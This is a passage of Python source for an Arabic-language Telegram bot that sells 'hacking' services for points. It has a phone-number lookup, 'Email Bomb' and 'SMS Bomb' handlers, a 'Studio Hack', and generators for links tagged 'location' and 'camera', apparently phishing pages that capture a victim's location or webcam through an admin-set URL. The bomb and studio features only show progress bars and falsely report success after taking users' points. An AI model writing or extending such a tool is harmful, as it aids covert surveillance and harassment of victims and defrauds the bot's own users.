            InlineKeyboardButton("🔍 Google", url=f"https://www.google.com/search?q={phone}"),
            InlineKeyboardButton("✈️ Telegram", url=f"https://t.me/{phone}"),
            InlineKeyboardButton("📸 Instagram", url=f"https://www.instagram.com/{phone}"),
            InlineKeyboardButton("📘 Facebook", url=f"https://www.facebook.com/search/top?q={phone}")
        )
        bot.send_message(cid, report, parse_mode='Markdown')
        bot.send_message(cid, "🔍 **Search Options:**", reply_markup=markup)
    run_progress_bar(chat_id, "Phone Scan", steps, final_action)

# --- قنبلة الإيميلات ---
@bot.callback_query_handler(func=lambda call: call.data == "email_bomb")
def ask_email(call):
    success, cost, current = check_and_deduct_points(call.from_user.id, 'price_email')
    if not success:
        show_insufficient_points(call, cost, current)
        return
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_email'), parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_email_bomb)

def process_email_bomb(message):
    email = message.text.strip()
    chat_id = message.chat.id
    steps = [(10, "Setup..."), (30, "Pumping..."), (50, "Bypass..."), (80, "Sending..."), (100, "Sent 1000 ✅")]
    run_progress_bar(chat_id, f"Email Bomb {email}", steps, lambda cid: bot.send_message(cid, "💣 **Done!**"))

# --- قنبلة الرسائل ---
@bot.callback_query_handler(func=lambda call: call.data == "sms_bomb")
def ask_sms(call):
    success, cost, current = check_and_deduct_points(call.from_user.id, 'price_sms')
    if not success:
        show_insufficient_points(call, cost, current)
        return
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_sms'), parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_sms_bomb)

def process_sms_bomb(message):
    phone = message.text.strip()
    chat_id = message.chat.id
    steps = [(10, "Setup..."), (30, "Sending..."), (50, "Sending..."), (80, "Sending..."), (100, "Sent 200 ✅")]
    run_progress_bar(chat_id, f"SMS Bomb {phone}", steps, lambda cid: bot.send_message(cid, "📨 **Done!**"))

# --- الاستوديو ---
@bot.callback_query_handler(func=lambda call: call.data == "studio_fake")
def ask_studio(call):
    success, cost, current = check_and_deduct_points(call.from_user.id, 'price_studio')
    if not success:
        show_insufficient_points(call, cost, current)
        return
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_studio'), parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_studio)

def process_studio(message):
    steps = [(10, "Connecting..."), (40, "Bypassing..."), (70, "Accessing..."), (100, "Access Denied ❌")]
    run_progress_bar(message.chat.id, "Studio Hack", steps, lambda cid: None)

# --- معلومات حسابك ---
@bot.callback_query_handler(func=lambda call: call.data == "account_info")
def show_account_info(call):
    user = get_user(call.from_user.id)
    points = user['points'] if user else 0
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users WHERE invited_by=?", (call.from_user.id,))
    invites = cursor.fetchone()[0]; conn.close()
    invite_link = f"https://t.me/{bot.get_me().username}?start={call.from_user.id}"
    text = get_text(call.from_user.id, 'account_info').format(call.from_user.first_name, call.from_user.username or "NoUser", call.from_user.id, invites, points, invite_link)
    bot.send_message(call.message.chat.id, text, parse_mode='HTML')

# --- الرصيد غير الكافي ---
def show_insufficient_points(call, cost, points):
    needed = cost - points
    text = get_text(call.from_user.id, 'msg_insufficient').format(cost, points, needed)
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(get_text(call.from_user.id, 'btn_invite_short'), callback_data="invite"),
        InlineKeyboardButton(get_text(call.from_user.id, 'btn_support_short'), url=f"tg://user?id={ADMIN_ID}")
    )
    bot.send_message(call.message.chat.id, text, parse_mode='Markdown', reply_markup=markup)

# --- الروابط ---
@bot.callback_query_handler(func=lambda call: call.data in ["get_loc", "get_cam", "get_basic"])
def process_link(call):
    if call.data == "get_basic": price_key, mode, name = 'price_basic', "basic", get_text(call.from_user.id, 'btn_basic')
    elif call.data == "get_loc": price_key, mode, name = 'price_loc', "location", get_text(call.from_user.id, 'btn_loc')
    else: price_key, mode, name = 'price_cam', "camera", get_text(call.from_user.id, 'btn_cam')

    success, cost, current = check_and_deduct_points(call.from_user.id, price_key)
    if not success:
        show_insufficient_points(call, cost, current)
        return

    user = get_user(call.from_user.id)
    user_lang = user['lang'] if user and 'lang' in user.keys() else 'ar'
    link = f"{get_setting('base_url')}/?id={call.from_user.id}&mode={mode}&lang={user_lang}"

    markup = InlineKeyboardMarkup().add(InlineKeyboardButton(get_text(call.from_user.id, 'btn_open').format(name), url=link))
    text = get_text(call.from_user.id, 'msg_link_ready').format(name, link)
    bot.send_message(call.message.chat.id, text, parse_mode='HTML', reply_markup=markup, disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: call.data == "invite")
def invite(call):
    link = f"https://t.me/{bot.get_me().username}?start={call.from_user.id}"
    bot.send_message(call.message.chat.id, f"👥 **Invite Link:**\n<code>{link}</code>", parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "my_points")
def my_points(call):
    pts = get_user(call.from_user.id)['points']
    bot.answer_callback_query(call.id, get_text(call.from_user.id, 'msg_points').format(pts), show_alert=True)

# ==========================================
# --- لوحة تحكم الأدمن (معدلة ومترجمة) ---
# ==========================================
def show_admin_panel(message):
    text = get_text(message.from_user.id, 'admin_panel')
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_preview'), callback_data="admin_preview"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_users'), callback_data="admin_users"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_broadcast'), callback_data="admin_broadcast"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_points'), callback_data="admin_points"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_prices'), callback_data="admin_prices"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_link'), callback_data="admin_link"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_channel'), callback_data="admin_channel"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_del_channel'), callback_data="admin_del_channel"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_edit_names'), callback_data="admin_edit_names"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_ban'), callback_data="admin_ban"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_unban'), callback_data="admin_unban"),
        InlineKeyboardButton(get_text(message.from_user.id, 'admin_add'), callback_data="admin_add")
    )
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.message_handler(commands=['admin'])
def admin_cmd(message):
    if is_admin(message.from_user.id): show_admin_panel(message)

@bot.callback_query_handler(func=lambda call: call.data == "admin_preview" and is_admin(call.from_user.id))
def admin_preview(call):
    show_user_panel(call.message.chat.id, call.from_user.first_name, call.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_users" and is_admin(call.from_user.id))
def admin_users(call):
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("SELECT user_id, first_name, username FROM users LIMIT 20")
    users = cursor.fetchall(); conn.close()
    text = "👥 **المستخدمين:**\n\n"
    for u in users:
        uname = f"@{u['username']}" if u['username'] else "لا يوجد"
        text += f"👤 {u['first_name']} | 🔗 {uname} | 🆔 {u['user_id']}\n➖➖➖➖➖➖➖➖\n"
    bot.send_message(call.message.chat.id, text)

@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast" and is_admin(call.from_user.id))
def admin_broadcast(call):
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_broadcast'))
    bot.register_next_step_handler(msg, send_broadcast)

def send_broadcast(message):
    users = get_all_users()
    success = 0
    status = bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_broadcast_sending').format(len(users)))
    for uid in users:
        try:
            bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
            success += 1
            time.sleep(0.05)
        except: pass
    bot.edit_message_text(get_text(message.from_user.id, 'msg_broadcast_done').format(success), chat_id=message.chat.id, message_id=status.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_link" and is_admin(call.from_user.id))
def admin_link(call):
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_link'))
    bot.register_next_step_handler(msg, lambda m: (set_setting('base_url', m.text.strip()), bot.send_message(m.chat.id, get_text(m.from_user.id, 'msg_link_updated'))))

@bot.callback_query_handler(func=lambda call: call.data == "admin_prices" and is_admin(call.from_user.id))
def admin_prices(call):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"عامة: {get_setting('price_basic')}", callback_data="price_basic"),
        InlineKeyboardButton(f"IP: {get_setting('price_ip')}", callback_data="price_ip"),
        InlineKeyboardButton(f"رقم: {get_setting('price_phone')}", callback_data="price_phone"),
        InlineKeyboardButton(f"موقع: {get_setting('price_loc')}", callback_data="price_loc"),
        InlineKeyboardButton(f"كاميرا: {get_setting('price_cam')}", callback_data="price_cam"),
        InlineKeyboardButton(f"إيميل: {get_setting('price_email')}", callback_data="price_email"),
        InlineKeyboardButton(f"رسائل: {get_setting('price_sms')}", callback_data="price_sms"),
        InlineKeyboardButton(f"استوديو: {get_setting('price_studio')}", callback_data="price_studio")
    )
    bot.send_message(call.message.chat.id, "⚙️ اختر الميزة:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('price_') and is_admin(call.from_user.id))
def edit_price(call):
    key = call.data
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_price').format(key))
    bot.register_next_step_handler(msg, save_price, key)

def save_price(message, key):
    if message.text.isdigit():
        set_setting(key, message.text.strip())
        bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_price_updated'))
        admin_prices(message)
    else:
        bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_price_error'))

@bot.callback_query_handler(func=lambda call: call.data == "admin_points" and is_admin(call.from_user.id))
def admin_points(call):
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_user'))
    bot.register_next_step_handler(msg, show_points_control)

def show_points_control(message):
    try:
        target_id = int(message.text.strip())
        user = get_user(target_id)
        if not user: return bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_user_not_found'))

        markup = InlineKeyboardMarkup(row_width=3)
        markup.add(
            InlineKeyboardButton("+1", callback_data=f"pts_{target_id}_1"), InlineKeyboardButton("+10", callback_data=f"pts_{target_id}_10"),
            InlineKeyboardButton("+20", callback_data=f"pts_{target_id}_20"), InlineKeyboardButton("-1", callback_data=f"pts_{target_id}_-1"),
            InlineKeyboardButton("-10", callback_data=f"pts_{target_id}_-10")
        )
        bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_points_select').format(target_id), reply_markup=markup)
    except:
        bot.send_message(message.chat.id, "❌ ID Error.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('pts_'))
def process_points_change(call):
    data = call.data.split('_')
    target_id, amount = int(data[1]), int(data[2])
    add_points(target_id, amount)

    user = get_user(target_id)
    lang = user['lang'] if user and 'lang' in user.keys() else 'ar'
    msg_success = "🎁 مبروك! تم إضافة {} نقطة لرصيدك." if lang == 'ar' else "🎁 Congrats! {} points added."
    if lang == 'en': msg_success = "🎁 Congrats! {} points added."
    elif lang == 'hi': msg_success = "🎁 बधाई! आपके खाते में {} अंक जोड़े गए।"

    try: bot.send_message(target_id, msg_success.format(amount))
    except: pass

    bot.answer_callback_query(call.id, "✅ Done.")
    bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_points_now').format(get_user(target_id)['points']))

@bot.callback_query_handler(func=lambda call: call.data == "admin_ban" and is_admin(call.from_user.id))
def admin_ban(call):
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_ban'))
    bot.register_next_step_handler(msg, execute_ban)

def execute_ban(message):
    try:
        target_id = int(message.text.strip())
        conn = get_db(); cursor = conn.cursor()
        cursor.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (target_id,))
        conn.commit(); conn.close()
        bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_ban_done').format(target_id))
    except: bot.send_message(message.chat.id, "❌ ID Error.")

@bot.callback_query_handler(func=lambda call: call.data == "admin_unban" and is_admin(call.from_user.id))
def admin_unban(call):
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("SELECT user_id, first_name FROM users WHERE is_banned=1")
    banned = cursor.fetchall(); conn.close()
    if not banned: return bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_unban'))
    for u in banned:
        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("✅ Unban", callback_data=f"unban_{u['user_id']}"))
        bot.send_message(call.message.chat.id, f"👤 {u['first_name']} | 🆔 {u['user_id']}", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('unban_'))
def process_unban(call):
    user_id = int(call.data.split('_')[1])
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (user_id,))
    conn.commit(); conn.close()
    bot.answer_callback_query(call.id, "✅ Done.")
    bot.edit_message_text("✅ Unbanned.", chat_id=call.message.chat.id, message_id=call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_add" and is_admin(call.from_user.id))
def admin_add(call):
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_admin'))
    bot.register_next_step_handler(msg, add_new_admin)

def add_new_admin(message):
    try:
        target_id = int(message.text.strip())
        conn = get_db(); cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (target_id,))
        conn.commit(); conn.close()
        bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_admin_done').format(target_id))
        try: bot.send_message(target_id, get_text(target_id, 'msg_admin_welcome'))
        except: pass
    except: bot.send_message(message.chat.id, "❌ ID Error.")

# ✅ admin_channel الجديدة — قائمة أنواع القنوات للإضافة
@bot.callback_query_handler(func=lambda call: call.data == "admin_channel" and is_admin(call.from_user.id))
def admin_channel(call):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(get_text(call.from_user.id, 'admin_add_tg'), callback_data="add_ch_telegram"),
        InlineKeyboardButton(get_text(call.from_user.id, 'admin_add_yt'), callback_data="add_ch_youtube"),
        InlineKeyboardButton(get_text(call.from_user.id, 'admin_add_wa'), callback_data="add_ch_whatsapp"),
        InlineKeyboardButton(get_text(call.from_user.id, 'admin_add_tt'), callback_data="add_ch_tiktok"),
        InlineKeyboardButton(get_text(call.from_user.id, 'admin_add_bot'), callback_data="add_ch_bot"),
        InlineKeyboardButton(get_text(call.from_user.id, 'btn_back'), callback_data="back_admin")
    )
    bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'admin_channels_menu'), reply_markup=markup)

# ✅ استقبال نوع القناة ثم رابطها
@bot.callback_query_handler(func=lambda call: call.data.startswith("add_ch_") and is_admin(call.from_user.id))
def admin_add_channel(call):
    ch_type = call.data.replace("add_ch_", "")
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_ch_link'))
    bot.register_next_step_handler(msg, save_new_channel, ch_type)

def save_new_channel(message, ch_type):
    raw = message.text.strip()
    title, channel_id = raw, raw
    try:
        if ch_type == 'telegram':
            u = raw.replace('https://t.me/', '').replace('http://t.me/', '').replace('t.me/', '').strip('/ ')
            if not u.startswith('@') and not u.startswith('-100'):
                u = '@' + u
            channel_id = u
            try:
                chat = bot.get_chat(u)
                title = chat.title or u
            except:
                title = u
        elif ch_type == 'bot':
            u = raw.replace('https://t.me/', '').replace('t.me/', '').strip('/ ')
            if not u.startswith('@'):
                u = '@' + u
            title = u
            channel_id = u
        else:
            if not raw.startswith('http'):
                raise ValueError("Link must start with http")
            channel_id = raw
            title = raw[:50]
    except Exception as e:
        bot.send_message(message.chat.id, f"{get_text(message.from_user.id, 'msg_ch_error')}\n<code>{e}</code>", parse_mode='HTML')
        return

    conn = get_db(); cursor = conn.cursor()
    cursor.execute(
        "INSERT OR IGNORE INTO required_channels (channel_type, channel_id, title) VALUES (?,?,?)",
        (ch_type, channel_id, title)
    )
    conn.commit(); conn.close()
    bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_ch_added'))
    show_admin_panel(message)

# ✅ admin_del_channel الجديدة — قائمة بكل القنوات وكل واحدة جنبها ❌
@bot.callback_query_handler(func=lambda call: call.data == "admin_del_channel" and is_admin(call.from_user.id))
def admin_del_channel(call):
    show_channels_delete_list(call.message.chat.id, call.from_user.id)

def show_channels_delete_list(chat_id, user_id):
    channels = get_channels()
    if not channels:
        markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton(get_text(user_id, 'btn_back'), callback_data="back_admin"))
        bot.send_message(chat_id, get_text(user_id, 'msg_no_channels'), reply_markup=markup)
        return

    markup = InlineKeyboardMarkup(row_width=1)
    for ch in channels:
        url = get_channel_url(ch)
        emoji = TYPE_EMOJI.get(ch['channel_type'], '🔗')
        title = (ch['title'] or '')[:40]
        row = []
        if url:
            row.append(InlineKeyboardButton(f"{emoji} {title}", url=url))
        else:
            row.append(InlineKeyboardButton(f"{emoji} {title}", callback_data="noop"))
        row.append(InlineKeyboardButton("❌", callback_data=f"del_ch:{ch['id']}"))
        markup.row(*row)
    markup.add(InlineKeyboardButton(get_text(user_id, 'btn_back'), callback_data="back_admin"))
    bot.send_message(chat_id, get_text(user_id, 'msg_del_list'), reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "noop")
def noop(call):
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "back_admin" and is_admin(call.from_user.id))
def back_admin(call):
    try: bot.delete_message(call.message.chat.id, call.message.message_id)
    except: pass
    show_admin_panel(call.message)

# ✅ تنفيذ الحذف — بالـ id بتاع السطر نفسه (مش الـ channel_id)
@bot.callback_query_handler(func=lambda call: call.data.startswith("del_ch:") and is_admin(call.from_user.id))
def delete_channel(call):
    try:
        row_id = int(call.data.split(":", 1)[1])
        conn = get_db(); cursor = conn.cursor()
        cursor.execute("DELETE FROM required_channels WHERE id = ?", (row_id,))
        conn.commit(); conn.close()
        bot.answer_callback_query(call.id, get_text(call.from_user.id, 'msg_deleted'))
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        show_channels_delete_list(call.message.chat.id, call.from_user.id)
    except Exception as e:
        bot.answer_callback_query(call.id, f"❌ {e}", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "admin_edit_names" and is_admin(call.from_user.id))
def admin_edit_names(call):
    markup = InlineKeyboardMarkup(row_width=1)
    buttons = {
        'name_basic': get_setting('name_basic'), 'name_ip': get_setting('name_ip'),
        'name_phone': get_setting('name_phone'), 'name_loc': get_setting('name_loc'),
        'name_cam': get_setting('name_cam'), 'name_email': get_setting('name_email'),
        'name_sms': get_setting('name_sms'), 'name_studio': get_setting('name_studio'),
        'name_account': get_setting('name_account'), 'name_invite': get_setting('name_invite'),
        'name_points': get_setting('name_points'), 'name_support': get_setting('name_support')
    }
    for k, v in buttons.items():
        markup.add(InlineKeyboardButton(v, callback_data=f"editname_{k}"))
    bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_edit_names'), reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('editname_'))
def ask_new_name(call):
    key = call.data.replace('editname_', '')
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_send_new_name').format(get_setting(key)))
    bot.register_next_step_handler(msg, save_new_name, key)

def save_new_name(message, key):
    set_setting(key, message.text.strip())
    bot.send_message(message.chat.id, get_text(message.from_user.id, 'msg_name_updated'))
    admin_edit_names(message)

# تشغيل
if __name__ == '__main__':
    print("Bot is running...")
    threading.Thread(target=send_startup_message).start()
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            time.sleep(5)
